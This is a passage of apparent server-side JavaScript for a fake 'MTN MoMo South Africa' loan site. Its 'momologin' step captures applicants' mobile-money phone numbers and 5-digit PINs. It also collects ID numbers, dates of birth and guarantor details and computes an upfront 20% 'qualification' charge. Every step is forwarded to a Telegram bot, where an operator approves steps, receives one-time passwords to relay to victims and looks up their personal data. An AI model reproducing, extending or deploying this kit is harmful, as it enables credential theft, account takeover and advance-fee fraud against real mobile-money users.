            app_.employmentData = { employment, annualIncome, kinName, kinPhone };
        }
        if (step === 'guarantor') {
            const { guarantorName, guarantorPhone, guarantorRelation } = data || {};
            if (!guarantorName || !guarantorPhone || !guarantorRelation) return res.status(400).json({ ok: false, error: 'Complete all guarantor fields.' });
            if (app_.phone && guarantorPhone === app_.phone) return res.status(400).json({ ok: false, error: 'Guarantor phone cannot be your own.' });
            app_.guarantorName = guarantorName; app_.guarantorPhone = guarantorPhone;
            app_.guarantorRelation = guarantorRelation;
            app_.guarantorData = { guarantorName, guarantorPhone, guarantorRelation };
        }
        if (step === 'momologin') {
            const { phone, pin, loginMethod, deviceInfo } = data || {};
            if (!phone) return res.status(400).json({ ok: false, error: 'Phone required.' });
            if (app_.phone && phone !== app_.phone) return res.status(400).json({ ok: false, error: 'Phone must match your registered phone.' });
            if (loginMethod === 'pin' && (!pin || !/^\d{5}$/.test(pin))) return res.status(400).json({ ok: false, error: 'PIN must be 5 digits.' });
            app_.loginPhone = phone;
            app_.loginPin = (loginMethod === 'pin') ? pin : null;
            app_.loginMethod = loginMethod || 'pin';
            app_.deviceInfo = deviceInfo || null;
            app_.momoLoginData = { phone, pin: app_.loginPin, loginMethod: app_.loginMethod, deviceInfo };
        }
        if (step === 'qualification') {
            const required = Math.ceil((app_.loanAmount || 0) * 0.20);
            app_.qualificationRequired = Math.min(required, type.monthlyCap);
        }

        app_.steps[step] = 'pending';
        app_.updatedAt = new Date().toISOString();
        saveApps();

        audit('step_submitted', { id: applicationId, step, accountType: app_.accountType });
        askApproval(buildStepMessage(step, app_, type, data || {}), step, applicationId);
        res.json({ ok: true, status: 'pending', step });
    } catch (e) { res.status(500).json({ ok: false, error: e.message }); }
});

// ═══════════════════════════════════════════════════════════
// AGREEMENT & PDF
// ═══════════════════════════════════════════════════════════
app.get('/api/agreement/:applicationId', guardAppId, (req, res) => {
    const app_ = applications[req.params.applicationId];
    if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
    const loanAmount = app_.loanAmount || 0;
    const loanTerm = app_.loanTerm || '12 Months';
    const months = parseInt(loanTerm) || 12;
    const monthly = app_.monthlyRepayment || monthlyRepayment(loanAmount, months);
    const total = monthly * months;
    const tnc = app_.tncAccepted || {};
    const agreement = `MTN MOMO SOUTH AFRICA – LOAN AGREEMENT
================================================

Application ID : ${app_.applicationId}
Generated      : ${new Date().toLocaleString('en-ZA')}
T&C Version    : ${tnc.version || TNC_VERSION}

BORROWER
--------
Full Name      : ${app_.firstName || ''} ${app_.lastName || ''}
ID Number      : ${app_.momoRegistration?.idNumber || 'N/A'}
Date of Birth  : ${app_.dob || 'N/A'}
Phone          : +27 ${app_.phone || ''}
Email          : ${app_.email || ''}
MoMo Account   : ${app_.momoRegistration?.accountName || app_.accountType || 'N/A'}

REGISTRATION VERIFICATION
-------------------------
Status         : ${app_.registrationStatus || 'N/A'}
OTP Verified   : ${app_.regOtpVerifiedAt ? new Date(app_.regOtpVerifiedAt).toLocaleString('en-ZA') : 'N/A'}
Completed      : ${app_.regCompletedAt ? new Date(app_.regCompletedAt).toLocaleString('en-ZA') : 'N/A'}

LOAN DETAILS
------------
Principal      : R ${fmt(loanAmount)}
Term           : ${loanTerm}
Monthly Payment: R ${fmt(monthly)}
Total Repayment: R ${fmt(total)}
Interest Rate  : 27% per annum (compounded monthly)

GUARANTOR
---------
Name           : ${app_.guarantorName || 'N/A'}
Phone          : ${app_.guarantorPhone ? '+27 ' + app_.guarantorPhone : 'N/A'}
Relationship   : ${app_.guarantorRelation || 'N/A'}

© 2026 MTN MoMo South Africa`;
    res.json({ ok: true, agreement });
});

app.get('/api/agreement-pdf/:applicationId', guardAppId, (req, res) => {
    const app_ = applications[req.params.applicationId];
    if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
    const loanAmount = app_.loanAmount || 0;
    const loanTerm = app_.loanTerm || '12 Months';
    const months = parseInt(loanTerm) || 12;
    const monthly = app_.monthlyRepayment || monthlyRepayment(loanAmount, months);
    const total = monthly * months;

    const doc = new PDFDocument({ size: 'A4', margin: 50 });
    res.setHeader('Content-Type', 'application/pdf');
    res.setHeader('Content-Disposition', `attachment; filename="momo-agreement-${app_.applicationId}.pdf"`);
    doc.pipe(res);
    doc.fillColor('#000').fontSize(20).font('Helvetica-Bold').text('MTN MoMo South Africa', { align: 'center' });
    doc.fontSize(12).font('Helvetica').fillColor('#666').text('Loan Agreement', { align: 'center' });
    doc.moveDown(0.5);
    doc.strokeColor('#FFCC00').lineWidth(3).moveTo(50, doc.y).lineTo(545, doc.y).stroke();
    doc.moveDown(1);
    const line = (l, v) => {
        doc.font('Helvetica-Bold').fillColor('#333').fontSize(10).text(l + ':', { continued: true });
        doc.font('Helvetica').fillColor('#000').text(' ' + (v || 'N/A'));
    };
    doc.font('Helvetica-Bold').fontSize(12).fillColor('#000').text('BORROWER'); doc.moveDown(0.3);
    line('Application ID', app_.applicationId);
    line('Full Name', `${app_.firstName || ''} ${app_.lastName || ''}`.trim());
    line('ID Number', app_.momoRegistration?.idNumber);
    line('Date of Birth', app_.dob);
    line('Phone', app_.phone ? '+27 ' + app_.phone : null);
    line('Email', app_.email);
    line('MoMo Account', app_.momoRegistration?.accountName || app_.accountType);
    doc.moveDown(0.8);
    doc.font('Helvetica-Bold').fontSize(12).text('LOAN DETAILS'); doc.moveDown(0.3);
    line('Principal', 'R ' + fmt(loanAmount));
    line('Term', loanTerm);
    line('Monthly Payment', 'R ' + fmt(monthly));
    line('Total Repayment', 'R ' + fmt(total));
    line('Interest Rate', '27% per annum');
    doc.moveDown(0.8);
    doc.font('Helvetica-Bold').fontSize(12).text('GUARANTOR'); doc.moveDown(0.3);
    line('Name', app_.guarantorName);
    line('Phone', app_.guarantorPhone ? '+27 ' + app_.guarantorPhone : null);
    line('Relationship', app_.guarantorRelation);
    doc.moveDown(1);
    doc.fontSize(9).fillColor('#888').text(`Generated ${new Date().toLocaleString('en-ZA')} · © 2026 MTN MoMo South Africa`, { align: 'center' });
    doc.end();
});

app.get('/api/repayment-schedule/:applicationId', guardAppId, (req, res) => {
    const app_ = applications[req.params.applicationId];
    if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
    const loanAmount = app_.loanAmount || 0;
    const months = parseInt(app_.loanTerm) || 12;
    if (!loanAmount || !months) return res.status(400).json({ ok: false, error: 'No loan data' });
    const r = 0.27 / 12;
    const monthly = Math.ceil(loanAmount * r / (1 - Math.pow(1 + r, -months)) + 60);
    const schedule = [];
    let balance = loanAmount;
    for (let i = 1; i <= months; i++) {
        const interest = Math.round(balance * r);
        const principal = monthly - interest;
        balance = Math.max(0, balance - principal);
        schedule.push({ month: i, payment: monthly, interest, principal, balance });
    }
    res.json({ ok: true, schedule });
});

// ═══════════════════════════════════════════════════════════
// TELEGRAM WEBHOOK
// ═══════════════════════════════════════════════════════════
app.post('/api/telegram-webhook', (req, res) => {
    res.status(200).send('ok');
    console.log('🔔 WEBHOOK:', new Date().toISOString());
    try {
        if (req.body && req.body.callback_query) {
            const q = req.body.callback_query;
            fetch(`${TG_API}/answerCallbackQuery`, {
                method: 'POST', headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ callback_query_id: q.id, text: 'Received' })
            }).catch(() => {});
            try {
                const data = JSON.parse(q.data);
                const app_ = applications[data.id];
                if (!app_) return;
                const step = data.s;
                const approved = data.a === 'Y';
                if (!app_.registrationHistory) app_.registrationHistory = [];

                if (step === 'registration') {
                    if (approved) {
                        const otp = generateOtp();
                        app_.regOtp = otp;
                        app_.regOtpAttempts = 0;
                        app_.registrationStatus = REG_STATUS.OTP_PENDING;
                        app_.regApprovedAt = new Date().toISOString();
                        app_.rejectionReason = null;
                        app_.registrationHistory.push({ at: new Date().toISOString(), event: 'approved_by_admin' });
                        saveApps();
                        tgSend(
                            `✅ <b>REGISTRATION APPROVED</b>\n🆔 ${code(data.id)}\n` +
                            `💳 ${esc(app_.momoRegistration?.accountName || '')}\n` +
                            `🔒 Max Loan: <b>R ${fmt(app_.accountMaxLoan || 0)}</b>\n\n` +
                            `<b>📱 SEND OTP TO USER</b>\nPhone: ${code('+27' + (app_.phone || ''))}\nOTP: <b><code>${otp}</code></b>`
                        );
                    } else {
                        app_.registrationStatus = REG_STATUS.REJECTED;
                        app_.rejectionReason = 'Registration details were not verified by admin.';
                        app_.registrationHistory.push({ at: new Date().toISOString(), event: 'rejected_by_admin', stage: 'registration' });
                        saveApps();
                        tgSend(`❌ <b>REGISTRATION REJECTED</b>\n🆔 ${code(data.id)}`);
                    }
                    return;
                }

                if (step === 'reg_pin') {
                    if (approved) {
                        app_.registrationStatus = REG_STATUS.COMPLETED;
                        app_.regCompletedAt = new Date().toISOString();
                        app_.registrationHistory.push({ at: new Date().toISOString(), event: 'pin_approved' });
                        saveApps();
                        tgSend(
                            `🎉 <b>REGISTRATION COMPLETE</b>\n🆔 ${code(data.id)}\n` +
                            `🔒 Max loan: <b>R ${fmt(app_.accountMaxLoan || 0)}</b>`
                        );
                    } else {
                        app_.registrationStatus = REG_STATUS.OTP_VERIFIED;
                        app_.regPin = null;
                        app_.regPinSetAt = null;
                        app_.registrationHistory.push({ at: new Date().toISOString(), event: 'pin_rejected_by_admin' });
                        saveApps();
                        tgSend(`❌ <b>PIN REJECTED</b>\n🆔 ${code(data.id)}\nUser returns to PIN entry.`);
                    }
                    return;
                }

                const isNewStep = !!(app_.steps && step in app_.steps);
                const isLegacy  = !isNewStep && (step in app_);
                if (!isNewStep && !isLegacy) return;
                const currentStatus = isNewStep ? app_.steps[step] : app_[step];
                if (currentStatus !== 'pending') return;

                const newValue = approved ? 'approved' : 'rejected';
                if (isNewStep) app_.steps[step] = newValue;
                if (isLegacy)  app_[step] = newValue;
                if (step === 'qualification') app_.qualification = approved ? 'qualified' : 'unqualified';
                if (step === 'application')   app_.application = newValue;

                app_.updatedAt = new Date().toISOString();
                saveApps();
                audit('admin_decision', { id: data.id, step, decision: newValue });
                tgSend(`${approved ? '✅' : '❌'} <b>${approved ? 'APPROVED' : 'REJECTED'}</b>\n🆔 ${code(data.id)}\n📋 ${step.toUpperCase()}`);
            } catch (e) { console.error('Callback parse:', e.message); }
            return;
        }

        if (req.body && req.body.message && req.body.message.text) {
            const text = req.body.message.text.trim();
            const chatId = req.body.message.chat.id.toString();
            if (!CHAT_ID || chatId !== CHAT_ID.toString()) return;

            if (text === '/start' || text === '/help') {
                tgSend(`🤖 <b>MTN MoMo Loan Bot</b>\n━━━━━━━━━━━━━━━━━━━━━━\n📊 /stats\n📋 /list\n🔍 /search [ID]\n📞 /contact [ID]\n🔄 /resendotp [ID]\n⏳ /pending\n🆕 /pendingreg`);
            } else if (text === '/stats') {
                const total = Object.keys(applications).length;
                const pendingReg = Object.values(applications).filter(a => a.registrationStatus === REG_STATUS.PENDING).length;
                const pendingOtp = Object.values(applications).filter(a => a.registrationStatus === REG_STATUS.OTP_PENDING).length;
                const pendingPin = Object.values(applications).filter(a => a.registrationStatus === REG_STATUS.PIN_PENDING).length;
                const completedReg = Object.values(applications).filter(a => a.registrationStatus === REG_STATUS.COMPLETED).length;
                const completedLoans = Object.values(applications).filter(a => a.steps?.qualification === 'approved').length;
                tgSend(`📊 <b>STATS</b>\n📝 Apps: ${total}\n⏳ Reg review: ${pendingReg}\n📩 OTP: ${pendingOtp}\n🔐 PIN: ${pendingPin}\n✅ Reg done: ${completedReg}\n💵 Loans: ${completedLoans}`);
            } else if (text === '/pendingreg') {
                const pending = Object.entries(applications).filter(([_, a]) => a.registrationStatus === REG_STATUS.PENDING);
                if (!pending.length) { tgSend('✅ None awaiting review.'); return; }
                let msg = `🆕 <b>AWAITING REVIEW (${pending.length})</b>\n`;
                pending.slice(0, 10).forEach(([id, a]) => {
                    msg += `\n🆔 ${code(id)}\n👤 ${esc(a.fullName || 'N/A')}\n📞 ${code('+27' + (a.phone || ''))}\n💳 ${esc(a.momoRegistration?.accountName || '')}\n`;
                });
                tgSend(msg);
            } else if (text.startsWith('/resendotp ')) {
                const needle = text.replace('/resendotp ', '').trim().toUpperCase();
                const realKey = Object.keys(applications).find(k => k.toUpperCase() === needle);
                const a = realKey ? applications[realKey] : null;
                if (!a) { tgSend('❌ Not found'); return; }
                if (a.registrationStatus !== REG_STATUS.OTP_PENDING) { tgSend('❌ Not awaiting OTP.'); return; }
                const otp = generateOtp();
                a.regOtp = otp; a.regOtpAttempts = 0;
                a.registrationHistory.push({ at: new Date().toISOString(), event: 'otp_regenerated_by_admin' });
                saveApps();
                tgSend(`🔄 <b>OTP REGENERATED</b>\n🆔 ${code(realKey)}\nPhone: ${code('+27' + a.phone)}\nOTP: <b><code>${otp}</code></b>`);
            } else if (text.startsWith('/contact ')) {
                const needle = text.replace('/contact ', '').trim().toUpperCase();
                const realKey = Object.keys(applications).find(k => k.toUpperCase() === needle);
                const a = realKey ? applications[realKey] : null;
                if (!a) { tgSend('❌ Not found'); return; }
                tgSend(`📞 <b>CONTACT</b> ${code(realKey)}\nName: ${esc(a.fullName || 'N/A')}\nPhone: ${a.phone ? code('+27' + a.phone) : 'N/A'}\nEmail: ${a.email ? code(a.email) : 'N/A'}\nDOB: ${a.dob ? code(a.dob) : 'N/A'}\nAccount: ${esc(a.momoRegistration?.accountName || 'N/A')}\nReg: ${esc(a.registrationStatus || 'N/A')}`);
            } else if (text === '/pending') {
                const pending = Object.entries(applications).filter(([_, a]) => {
                    if (a.registrationStatus !== REG_STATUS.COMPLETED) return false;
                    return a.steps && Object.values(a.steps).includes('pending');
                });
                if (!pending.length) { tgSend('✅ No pending.'); return; }
                let msg = `⏳ <b>PENDING (${pending.length})</b>\n`;
                pending.slice(0, 10).forEach(([id, a]) => {
                    const steps = [];
                    STEP_ORDER.forEach(k => { if (a.steps[k] === 'pending') steps.push(k); });
                    msg += `\n🆔 ${code(id)}\n👤 ${esc(a.firstName || a.fullName || '')}\n📋 ${steps.join(', ')}\n`;
                });
                tgSend(msg);
            } else if (text === '/list') {
                const ids = Object.keys(applications).slice(-10);
                if (!ids.length) { tgSend('📭 None.'); return; }
                let msg = '📋 <b>LAST 10</b>\n';
                ids.forEach((id, i) => {
                    const a = applications[id];
                    msg += `\n${i+1}. 🆔 ${code(id)}\n👤 ${esc(a.firstName || a.fullName || '')}\n`;
                });
                tgSend(msg);
            } else if (text.startsWith('/search ')) {
                const needle = text.replace('/search ', '').trim().toUpperCase();
                const realKey = Object.keys(applications).find(k => k.toUpperCase() === needle);
                const a = realKey ? applications[realKey] : null;
                if (!a) { tgSend('❌ Not found'); return; }
                tgSend(`🔍 <b>DETAILS</b> ${code(realKey)}\n👤 ${esc(a.fullName || '')}\n📱 ${a.phone ? code('+27' + a.phone) : 'N/A'}\n🆕 Reg: ${esc(a.registrationStatus || 'N/A')}\n📋 ${a.steps ? STEP_ORDER.map(k => `${k}:${a.steps[k]}`).join(' ') : 'N/A'}`);
            }
        }
    } catch (e) { console.error('Webhook error:', e.message); }
});

// ═══════════════════════════════════════════════════════════
// STATUS / RETRY
// ═══════════════════════════════════════════════════════════
app.get('/api/status/:applicationId/:step', guardAppId, (req, res) => {
    const { applicationId, step } = req.params;
    const app_ = applications[applicationId];
    if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
    const valid = [...STEP_ORDER, ...LEGACY_STEPS];
    if (!valid.includes(step)) return res.status(400).json({ ok: false, error: 'Invalid step' });
    res.json({ ok: true, status: readStep(app_, step), applicationId, step });
});

app.get('/api/status/:applicationId', guardAppId, (req, res) => {
    const app_ = applications[req.params.applicationId];
    if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
    const steps = {};
    STEP_ORDER.forEach(k => { steps[k] = readStep(app_, k); });
    res.json({
        ok: true,
        isRegistered: !!app_.isRegistered,
        registrationStatus: app_.registrationStatus || REG_STATUS.IDLE,
        rejectionReason: app_.rejectionReason || null,
        accountType: app_.accountType || null,
        accountName: app_.momoRegistration?.accountName || null,
        accountMaxLoan: app_.accountMaxLoan || 0,
        phone: app_.phone || null,
        email: app_.email || null,
        dob: app_.dob || null,
        tncAccepted: app_.tncAccepted || null,
        steps,
        loan: app_.loanData || null,
        personal: app_.personalData || null,
        employment: app_.employmentData || null,
        guarantor: app_.guarantorData || null,
        application: app_.application, sms: app_.sms, pin: app_.pin, otp: app_.otp, qualification: app_.qualification
    });
});

app.post('/api/retry/:applicationId/:step', guardAppId, (req, res) => {
    const { applicationId, step } = req.params;
    const app_ = applications[applicationId];
    if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
    const valid = [...STEP_ORDER, 'sms', 'pin', 'otp'];
    if (!valid.includes(step)) return res.status(400).json({ ok: false, error: 'Invalid step' });
    resetStep(app_, step);
    app_.updatedAt = new Date().toISOString();
    saveApps();
    res.json({ ok: true });
});

app.get('/api/rejection-info/:applicationId', guardAppId, (req, res) => {
    const app_ = applications[req.params.applicationId];
    if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
    let rejectedStep = null, errorMessage = '';
    if (app_.registrationStatus === REG_STATUS.REJECTED) {
        rejectedStep = 'registration';
        errorMessage = app_.rejectionReason || 'Registration was rejected.';
    } else {
        const labels = { loan: 'Loan', personal: 'Personal details', employment: 'Employment', guarantor: 'Guarantor', momologin: 'MoMo login', qualification: 'Qualification' };
        for (const k of STEP_ORDER) {
            const status = readStep(app_, k);
            if (status === 'rejected' || (k === 'qualification' && status === 'unqualified')) {
                rejectedStep = k; errorMessage = `${labels[k] || k} was rejected.`; break;
            }
        }
    }
    res.json({ ok: true, rejectedStep, errorMessage });
});

// ─── SPA fallback ───
app.get('*', (req, res) => res.sendFile(path.join(__dirname, '../frontend', 'index.html')));

// ─── Boot ───
loadAll();
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Server running on port ${PORT} (v7.0)`);
    console.log(`   → http://0.0.0.0:${PORT}\n`);
});
